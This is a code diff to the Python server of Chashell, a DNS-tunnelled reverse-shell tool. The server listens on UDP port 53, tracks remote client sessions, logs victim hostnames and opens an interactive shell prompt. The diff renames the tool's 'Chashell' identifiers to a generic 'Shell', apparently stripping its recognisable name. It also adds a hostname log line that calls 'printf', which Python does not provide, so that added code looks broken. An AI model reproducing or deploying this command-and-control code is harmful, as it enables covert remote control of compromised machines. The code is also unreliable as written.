@@ -80,8 +80,8 @@ class PollTemporaryData:
 # Global caches
 poll_cache = {}
 
-class ChashellResolver(BaseResolver):
-    """DNS resolver for Chashell protocol."""
+class ShellResolver(BaseResolver):
+    """DNS resolver for Shell protocol."""
     
     def resolve(self, request, handler):
         """Handle DNS request."""
@@ -142,7 +142,7 @@ class ChashellResolver(BaseResolver):
             # Check if session exists, create if new
             if client_guid not in cli.sessions_map:
                 # <<< FORCE PRINT FULL ID WHEN A NEW CLIENT APPEARS >>>
-                print(f"\r\nNew session : {client_guid}\nchashell >>> ", end='', flush=True)
+                print(f"\r\nNew session : {client_guid}\nshell >>> ", end='', flush=True)
 
                 cli.sessions_map[client_guid] = ClientInfo()
                 cli.console_buffer[client_guid] = []
@@ -159,7 +159,13 @@ class ChashellResolver(BaseResolver):
                     return self.handle_poll_query(client_guid, data_packet_raw)
                 
                 elif message.HasField('infopacket'):
-                    session.hostname = message.infopacket.hostname.decode('utf-8', errors='ignore')
+                    hostname = message.infopacket.hostname.decode('utf-8', errors='ignore')
+                    old_hostname = session.hostname
+                    session.hostname = hostname
+                    
+                    # Only log if hostname changed or is new
+                    if old_hostname != hostname:
+                        printf(f"[{client_guid[:8]}] Host identified: {hostname}\n")
                 
                 elif message.HasField('chunkstart'):
                     self.handle_chunk_start(session, message.chunkstart)
@@ -284,12 +290,12 @@ def main():
         print("Error: TARGET_DOMAIN and ENCRYPTION_KEY must be set")
         sys.exit(1)
     
-    print(f"Starting Chashell Server")
+    print(f"Starting shell Server")
     print(f"Target Domain: {TARGET_DOMAIN}")
     print(f"Listening on UDP port 53\n")
     
     # Start DNS server in background thread
-    resolver = ChashellResolver()
+    resolver = ShellResolver()
     error_logger = DNSLogger(log="error", prefix=False)
 
     dns_server = DNSServer(resolver, port=53, address="0.0.0.0", logger=error_logger)
